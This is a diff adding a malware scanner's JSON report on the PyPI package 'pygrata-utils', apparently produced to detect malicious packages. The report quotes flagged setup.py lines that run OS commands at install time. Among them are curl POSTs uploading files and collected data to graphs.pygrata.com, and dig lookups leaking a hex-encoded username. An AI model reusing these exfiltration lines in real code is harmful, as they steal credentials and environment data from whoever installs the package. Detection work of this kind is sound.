@@ -1,0 +1,84 @@
+{
+    "issues": 13,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:35",
+                "code": "    result = subprocess.getoutput(acmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:38",
+                "code": "    getcred = subprocess.getoutput(accmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:43",
+                "code": "    result2 = subprocess.getoutput(bcmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:65",
+                "code": "        ipadd = subprocess.getoutput(ipcmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:73",
+                "code": "    result3 = subprocess.getoutput(ccmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:78",
+                "code": "    result4 = subprocess.getoutput(cdcmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:85",
+                "code": "    output = subprocess.getoutput(catenvcmd)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:91",
+                "code": "    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:92",
+                "code": "    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:98",
+                "code": "    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:104",
+                "code": "    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:105",
+                "code": "    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:111",
+                "code": "    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pygrata-utils-1.0.4"
+}
